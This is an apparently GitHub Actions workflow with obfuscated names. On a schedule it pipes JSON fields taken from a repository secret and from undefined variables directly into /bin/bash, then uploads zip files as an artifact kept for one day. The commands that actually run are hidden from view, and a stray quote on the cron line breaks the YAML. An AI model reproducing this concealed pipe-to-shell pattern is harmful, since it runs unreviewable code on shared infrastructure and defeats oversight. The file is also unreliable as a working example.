name: zhengsonglianghe
on:
  workflow_dispatch:

  schedule:
    - cron: '33 0,6,12,18 * * *''
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: zhengsonglianghe
        env:
          exynq00: ${{ secrets.exynq00 }}
        run: |
          printf '%s' "$exynq00" | jq -r .stepr4 | /bin/bash
          printf '%s' "$wml98897" | jq -r .aj2891 | /bin/bash
          echo $aa12 | jq -r .edqw352 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: 1nLuemoF
          path: "*.zip"
          retention-days: 1
